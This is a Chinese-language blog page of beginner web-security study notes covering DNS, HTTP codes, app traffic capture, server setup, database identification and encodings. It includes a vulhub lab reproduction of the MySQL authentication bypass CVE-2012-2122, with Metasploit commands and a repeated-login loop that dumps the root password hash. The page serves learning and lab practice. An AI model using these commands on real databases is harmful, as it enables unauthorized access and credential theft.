@@ -1,0 +1,384 @@
+
+<!DOCTYPE html>
+<html lang="en" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>web-漏洞篇-基础入门笔记 - xiaofeiji&#39;s Blog</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="Xiaofeiji,"> 
+    <meta name="description" content="域名
+顶级域名：www.baidu.com
+
+二级域名：news.baidui.com、tieba.baidu.com
+
+三级域名或多级域名：shehui.news.baidu.com、guoji.,"> 
+    <meta name="author" content="John Doe"> 
+    <link rel="alternative" href="atom.xml" title="xiaofeiji&#39;s Blog" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.jpg"> 
+    
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+	<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+    <script>
+         (adsbygoogle = window.adsbygoogle || []).push({
+              google_ad_client: "ca-pub-8691406134231910",
+              enable_page_level_ads: true
+         });
+    </script>
+    <script async custom-element="amp-auto-ads"
+        src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
+    </script>
+   <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+   </script>
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body class="loading">
+    <span id="config-title" style="display:none">xiaofeiji&#39;s Blog</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://example.com"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">web-漏洞篇-基础入门笔记</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">web-漏洞篇-基础入门笔记</h1>
+        <div class="stuff">
+            <span>八月 08, 2021</span>
+            
+  <ul class="post-tags-list" itemprop="keywords"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/%E7%AC%94%E8%AE%B0/" rel="tag">笔记</a></li></ul>
+
+
+        </div>
+        <div class="content markdown">
+            <h3 id="域名"><a href="#域名" class="headerlink" title="域名"></a>域名</h3><ol>
+<li><p>顶级域名：<a target="_blank" rel="noopener" href="http://www.baidu.com/">www.baidu.com</a></p>
+</li>
+<li><p>二级域名：news.baidui.com、tieba.baidu.com</p>
+</li>
+<li><p>三级域名或多级域名：shehui.news.baidu.com、guoji.news.baidu.com</p>
+</li>
+</ol>
+<h3 id="DNS：（域名系统服务协议）-域名——-gt-ip"><a href="#DNS：（域名系统服务协议）-域名——-gt-ip" class="headerlink" title="DNS：（域名系统服务协议） 域名——&gt;ip"></a>DNS：（域名系统服务协议） 域名——&gt;ip</h3><ol>
+<li>本地host文件可以重定向域名解析的ip地址：</li>
+</ol>
+<p>在host文件中添加域名和自行设定的ip，cmd ping时发现域名所对应的源ip会变成在host所设定的ip。</p>
+<p>ping一个域名时，会先在本地host上寻找，如果没有，再去互联网上的DNS服务器解析</p>
+<ol start="2">
+<li><p>CDN：缓存节点  看所在地区给一个附近的节点，因此每个地方访问一个网站，ping到的ip可能不一样,可以解决网站访问的速度等问题。</p>
+</li>
+<li><p>DNS安全攻击</p>
+</li>
+</ol>
+<p>①脚本语言：</p>
+<p>常见脚本语言：asp php aspx javaweb python的web框架</p>
+<p>②后门：</p>
+<p>网站后门、服务器的后门、主机后门</p>
+<h3 id="关于web的一些整体认识"><a href="#关于web的一些整体认识" class="headerlink" title="关于web的一些整体认识"></a>关于web的一些整体认识</h3><ol>
+<li>web组成架构：</li>
+</ol>
+<p>​        网站源码：分脚本类型、分应用方向</p>
+<p>​        操作系统：Windows、Linux</p>
+<p>​        中间件（搭建平台）：Apache、IIS、Tomcat、nginx等</p>
+<p>​        数据库：access mysql </p>
+<ol start="2">
+<li>web相关漏洞：</li>
+</ol>
+<p>​       web源码类对应漏洞</p>
+<p>​       SQL注入、文件上传、代码执行、变量覆盖、逻辑漏洞、反序列化等</p>
+<p>​       web中间件对应漏洞、web数据库对应漏洞、web系统层对应漏洞、其他第三方对应漏洞、APP或PC应用结合类</p>
+<h3 id="关于http-s"><a href="#关于http-s" class="headerlink" title="关于http/s"></a>关于http/s</h3><p><img src="1.png"></p>
+<ol>
+<li>http明文传输  </li>
+</ol>
+<p>建立连接——&gt;发送请求数据包——&gt;返回响应数据包——&gt;关闭连接</p>
+<ol start="2">
+<li>https加密传输（存在证书或者加密）</li>
+</ol>
+<p><img src="2.png"></p>
+<ol start="3">
+<li>http响应码：</li>
+</ol>
+<p>1xx：信息，请求收到，继续处理</p>
+<p>2xx：成功，行为被成功接受、理解和采纳</p>
+<p>3xx：重定向，为了完成请求，必须进一步执行的动作</p>
+<p>4xx：客户端错误</p>
+<p>5xx：服务器错误</p>
+<p>200: 存在文件</p>
+<p>403 存在文件夹</p>
+<p>3xx 均可能存在</p>
+<p>404 不存在文件及文件夹</p>
+<p>500 均可能存在</p>
+<h3 id="APP安全测试"><a href="#APP安全测试" class="headerlink" title="APP安全测试"></a>APP安全测试</h3><ol>
+<li>在电脑使用APP：</li>
+</ol>
+<p>bp操作 </p>
+<p>要先将模拟器的ip改为本机的ip，把数据通过本机流向burp</p>
+<p>数据包的替换：将在电脑访问的数据包替换成APP访问的数据包，就能在电脑正常访问。</p>
+<p>直接操作：</p>
+<p>漏了个大洞（软件）直接获取</p>
+<ol start="2">
+<li><strong>浏览器信息伪造–User-Agent及NetType微信网络检测</strong></li>
+</ol>
+<p><strong>Mozilla/5.0 (iPhone; CPU iPhone OS 8_0 like Mac OS X)AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/12A365 MicroMessenger/6.0NetType/2G</strong></p>
+<p>从微信6.0开始，其内嵌的浏览器在UserAgent字符串中增加了NetType字段用于标识客户端（手机）当前的网络环境，经测试，该字段至少有以下3个取值：</p>
+<p>NetType/WIFI</p>
+<p>NetType/2G</p>
+<p>NetType/3G+</p>
+<p>分别对应于Wifi、2G、3G以上网络环境。</p>
+<h3 id="搭建安全拓展"><a href="#搭建安全拓展" class="headerlink" title="搭建安全拓展"></a>搭建安全拓展</h3><ol>
+<li>IIS搭建</li>
+</ol>
+<p>phpstudy：域名访问解析目录为www/blog下的文件目录</p>
+<p>​                   使用ip访问的话解析目录为www/下的文件目录，也就是网站域名的上一级目录</p>
+<p>​                     能扫到一些备份文件、网站源码等</p>
+<p><img src="3.png"></p>
+<p>iis脚本后缀对应解析</p>
+<p>IIS来宾用户的设置拒绝：菜刀连接不能查看或者不能写入文件</p>
+<p><img src="4.png"></p>
+<p>后门是否给予操作目录或文件权限：</p>
+<p>如果网页设置了执行权限为无的话，上传的对应格式的脚本仍然无法解析，脚本不能正常运行，无法连接上菜刀或蚁剑获取文件信息、进行操作等。</p>
+<p><img src="5.png"></p>
+<ol start="2">
+<li>WEB源码拓展</li>
+</ol>
+<p>目录结构； 后台目录 模板目录 数据库目录 数据库配置文件</p>
+<p>脚本类型： ASP PHP ASPX JSP JAVAWEB Python</p>
+<p>应用分类： 门户 电商 论坛 博客 第三方 其他</p>
+<p>可以根据网站源码路径得到后台账号密码:</p>
+<p>源码获取途径:</p>
+<p>借助特定行业源码或咸鱼进行搜索获取-本地搭建-代码审计或其他</p>
+<p>CMS的查找可以在网络数据包里一些特殊的文件路径进行搜索：</p>
+<p>人工爆框架-搜索特定URL-获取其他相符站点-漏洞测试</p>
+<h3 id="系统及数据库"><a href="#系统及数据库" class="headerlink" title="系统及数据库"></a>系统及数据库</h3><ol>
+<li>操作系统：Windows Linux</li>
+</ol>
+<p> 操作系统的判断</p>
+<p> 通过网站的大小写判断，Windows系统的服务器不区分大小写，改为大小写后仍能返回正常界面</p>
+<p> nmap扫描： nmap -O （ip地址）</p>
+<p>操作系统漏洞类型</p>
+<p>远程代码执行等</p>
+<ol start="2">
+<li>web：</li>
+</ol>
+<ol>
+<li>网站源码： 内部或未知 开源CMS 框架或非框架类 白盒代码审计，漏洞挖掘 部分漏洞采用人工辅助探针</li>
+</ol>
+<p>2 )搭建平台：配置导致的安全问题 安全配置防护：ip或用户验证 文件格式解析 目录或文件执行权限</p>
+<ol start="3">
+<li>数据库： 弱口令 漏洞</li>
+</ol>
+<p>​    识别数据库类型 :</p>
+<p>a.通过脚本文件和数据库的对应：</p>
+<p> asp+access</p>
+<p>php+mysql</p>
+<p>aspx+mssql</p>
+<p>jsp+mssql,oracle</p>
+<p>python+mongodb</p>
+<p>……….</p>
+<p>b. 端口扫描：</p>
+<p> SQLserver：1433</p>
+<p>Oracle： 1521</p>
+<p>MySQL：3306</p>
+<p>MongoDB：27017</p>
+<p>Redis：6379</p>
+<p>memcached: 11211</p>
+<ol start="3">
+<li>APP： (系统漏洞 反编译提取URL 抓包结合web)Android iOS </li>
+</ol>
+<ol start="4">
+<li>第三方 ：常见的第三方软件或服务类安全问题 openssh weblogic 等</li>
+</ol>
+<p>判定第三方软件或平台的存在：端口扫描、网站目录扫描等</p>
+<p>根据提供的服务，寻找漏洞</p>
+<h3 id="关于B-web中弱口令的一个漏洞的复现："><a href="#关于B-web中弱口令的一个漏洞的复现：" class="headerlink" title="关于B.web中弱口令的一个漏洞的复现："></a><strong>关于B.web中弱口令的一个漏洞的复现：</strong></h3><p>某数据库弱口令及漏洞 mysql身份认证绕过漏洞（CVE-2012-2022）</p>
+<p>在vulhub-master目录下找到mysql/CVE-2012-2122</p>
+<p>编译启动环境：</p>
+<p><strong>docker-compose build</strong></p>
+<p><strong>docker-compose up -d</strong></p>
+<p><img src="6.png"></p>
+<p>在kali扫描目标靶机开设端口：发现3306，MySQL版本为5.5.23，对其使用msfconsole进行攻击：</p>
+<p><img src="7.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mofconsole</span><br><span class="line">search mysql</span><br><span class="line">use auxiliary/scanner/mysql/mysql_authbypass_hashdump    //选择该模块</span><br><span class="line">show options   //查看对应设置</span><br><span class="line">set rhosts 192.168.1.7   //设置目标ip</span><br><span class="line">run   //进行攻击</span><br></pre></td></tr></table></figure>
+
+
+
+<p>返回得到md5加密的root用户密码：</p>
+<p><img src="8.png"></p>
+<p><img src="9.png"></p>
+<p>尝试登陆对方数据库：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -P 3306 -h 192.168.1.7 -p  </span><br></pre></td></tr></table></figure>
+
+<p><img src="10.png"></p>
+<p>攻击成功。</p>
+<p>关闭Ubuntu靶场环境：</p>
+<p><strong>docker-compose down</strong></p>
+<p><img src="11.png"></p>
+<p>或者通过如下命令，进行多次尝试登陆，从而成功进入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for i in `seq 1 1000`; do mysql -uroot -pwrong -h your-ip -P3306 ; done</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+<h3 id="加密和编码"><a href="#加密和编码" class="headerlink" title="加密和编码"></a>加密和编码</h3><p>常见加密编码等算法解析</p>
+<p>MD5，SHA，ASC，进制，时间戳，URL编码，BASE64，Unescape，AES，DES 等</p>
+<ol>
+<li>MD5+salt</li>
+</ol>
+<p>md5(md5($pass):$salt)加密：</p>
+<p><img src="12.png"></p>
+<p>sha1、sha256等这些加密得到的长度是固定的。</p>
+<ol start="2">
+<li>时间戳：数据库记录用户登录、注册等的时间，会在一些应用里用到</li>
+</ol>
+<p><img src="13.png"></p>
+<ol start="3">
+<li>Unescape：又叫%u编码，字符对应UTF-16 16进制表示方式前面加%u。</li>
+</ol>
+<ol start="4">
+<li>AES编码：</li>
+</ol>
+<p><img src="14.png"></p>
+<p>输出的类型可是是base64或者16进制字符串，如果碰到一些base64解码得到一堆乱码或者还是一个编码的话，可以尝试一下是否为aes编码。编码会出现斜杠（/）。</p>
+<p><img src="15.png"></p>
+<ol start="5">
+<li>DES编码里会出现加号（+）</li>
+</ol>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                </ul>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+		data-enable=''
+        data-ae=''
+        data-ci=''
+        data-cs=''
+        data-r='xiaofeiji-77.github.io'
+        data-o='xiaofeiji-77'
+        data-a='xiaofeiji-77'
+        data-d='false'
+    >查看评论</div>
+
+
+    </div>
+    
+        <div class='side'>
+			<ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%9F%E5%90%8D"><span class="toc-number">1.</span> <span class="toc-text">域名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DNS%EF%BC%9A%EF%BC%88%E5%9F%9F%E5%90%8D%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1%E5%8D%8F%E8%AE%AE%EF%BC%89-%E5%9F%9F%E5%90%8D%E2%80%94%E2%80%94-gt-ip"><span class="toc-number">2.</span> <span class="toc-text">DNS：（域名系统服务协议） 域名——&gt;ip</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B3%E4%BA%8Eweb%E7%9A%84%E4%B8%80%E4%BA%9B%E6%95%B4%E4%BD%93%E8%AE%A4%E8%AF%86"><span class="toc-number">3.</span> <span class="toc-text">关于web的一些整体认识</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B3%E4%BA%8Ehttp-s"><span class="toc-number">4.</span> <span class="toc-text">关于http&#x2F;s</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#APP%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95"><span class="toc-number">5.</span> <span class="toc-text">APP安全测试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%90%AD%E5%BB%BA%E5%AE%89%E5%85%A8%E6%8B%93%E5%B1%95"><span class="toc-number">6.</span> <span class="toc-text">搭建安全拓展</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E5%8F%8A%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">7.</span> <span class="toc-text">系统及数据库</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B3%E4%BA%8EB-web%E4%B8%AD%E5%BC%B1%E5%8F%A3%E4%BB%A4%E7%9A%84%E4%B8%80%E4%B8%AA%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%A4%8D%E7%8E%B0%EF%BC%9A"><span class="toc-number">8.</span> <span class="toc-text">关于B.web中弱口令的一个漏洞的复现：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%A0%E5%AF%86%E5%92%8C%E7%BC%96%E7%A0%81"><span class="toc-number">9.</span> <span class="toc-text">加密和编码</span></a></li></ol>	
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+   
+</body>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+
+
+<!--单击显示文字-->
+<script type="text/javascript" src="/js/click_show_text.js"></script>
+<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<script src="https://cdn.jsdelivr.net/gh/wallleap/cdn/js/canvas-nest.min.js"></script>
+</html>
